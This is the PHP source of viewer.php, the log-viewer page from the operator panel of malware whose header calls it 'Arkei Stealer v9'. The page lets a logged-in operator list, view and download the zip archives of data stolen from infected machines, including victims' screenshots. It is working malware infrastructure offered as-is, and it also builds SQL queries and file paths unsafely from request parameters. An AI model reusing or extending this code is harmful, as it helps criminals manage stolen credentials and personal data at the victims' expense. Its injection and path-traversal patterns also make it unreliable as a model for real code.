<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [viewer.php]
*    Online log viewer
*/

session_start();

require("../app/config.php");

error_reporting(0);

function convertToReadableSize($size)
{
  $base = log($size) / log(1024);
  $suffix = array(" B", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/auth.php', true, 301 );
	exit(0);
}

$userProfile = $_SESSION["profile"];

$log = checkParam($_GET["log"]);
$file = checkParam($_GET["file"]);
$action = checkParam($_GET["action"]);

$pageName = "View #". $log;

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

$checkLog = $database->query("SELECT * FROM `logs` WHERE `user`='$log'")->fetch_array();

if($userProfile != "0")
{
	if($userProfile != $checkLog["profile"])
	{
		header( 'Location: http://'. $config["panel_url"] .'/dashboard.php', true, 301 );
		exit(0);
	}
}

if($log != NULL)
{
	if($file != null)
	{
		if($action == "download")
		{
			$zip = new ZipArchive;
			$reading = "";
			
			if ($zip->open(realpath('../'.$config["logs_folder"].'/'. $log .'')) === TRUE) 
			{
				$reading = $zip->getFromName($file);
				$zip->close();
				
				header('Content-type: application/zip');
				header('Content-Disposition: attachment; filename="'. $file .'"');
				header('Content-Length: ' . strlen($reading));
					
				echo $reading;
			} 
			else 
			{
				echo 'Error Reading File.';
			}
			
			exit(0);
		}
		
		if($file == "/screenshot.jpg")
		{
			$z = new ZipArchive();
			
			if ($z->open(realpath('../'.$config["logs_folder"].'/'. $log .'')) !== true) {
				echo "File not found.";
				return false;
			}

			$stat = $z->statName($file);
			$fp   = $z->getStream($file);
			if(!$fp) {
				echo "Could not load image.";
				return false;
			}

			header('Content-Type: image/jpeg');
			header('Content-Length: ' . $stat['size']);
			fpassthru($fp);
			
			exit(0);
		}
		else
		{
			$zip = new ZipArchive;
			$reading = "";
			
			if ($zip->open(realpath('../'.$config["logs_folder"].'/'. $log .'')) === TRUE) 
			{
				$reading = $zip->getFromName($file);
				$zip->close();
					
				echo nl2br($reading);
			} 
			else 
			{
				echo 'Error Reading File.';
			}
			
			exit(0);
		}
	}
	else if($action == "download")
	{
		$reading = "";
		
		$handle = fopen(realpath('../'.$config["logs_folder"].'/'. $log .''), "r");
		
		if($handle)
		{
			$reading = fread($handle, filesize("../". $config["logs_folder"] ."/". $log));
			
			header('Content-type: application/txt');
			header('Content-Disposition: attachment; filename="'. $log .'"');
			header('Content-Length: ' . strlen($reading));
			
			echo $reading;
		}
		else 
		{
			echo 'Error Reading File.';
		}
		
		exit(0);
	}
	else
	{
		$zip = zip_open(realpath('../'.$config["logs_folder"].'/'. $log .''));
	}
}
else
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit();
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

require("template/header.tmpl.php");

?>
<div class="wrapper">
	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
				
				<?php							
							if(!$zip)
							{
								?>
								<h4 class="page-title">Can't open log.</h4>
								<?
								exit(0);
							}
								
							?>
				
					<h4 class="page-title"><? echo $log; ?></h4>
				</div>
			</div>
		</div> 

		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
					
						<h4 class="header-title">Files</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>Size</th>
											<th>Name</th>
											<th>Actions</th>
										</tr>
									</thead>
									
									<tbody>
									<?php
									while ($zip_entry = zip_read($zip))
									{
									?>
										<tr>
										
											<td><? echo  convertToReadableSize(zip_entry_filesize($zip_entry)); ?></td>
											<td><? echo  zip_entry_name($zip_entry); ?></td>
											<td>
												<div class="btn-group">
													<button type="button" class="btn btn-info dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
													<div class="dropdown-menu">
														<a class="dropdown-item" href="viewer.php?log=<? echo $log; ?>&file=<? echo  zip_entry_name($zip_entry); ?>">View online</a>
														<a class="dropdown-item" href="viewer.php?log=<? echo $log; ?>&file=<? echo  zip_entry_name($zip_entry); ?>&action=download">Download</a>
													</div>
												</div>
											</td>
										</tr>
										
									<?
									}
									?>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php

require("template/footer.tmpl.php");
zip_close($zip); 

?>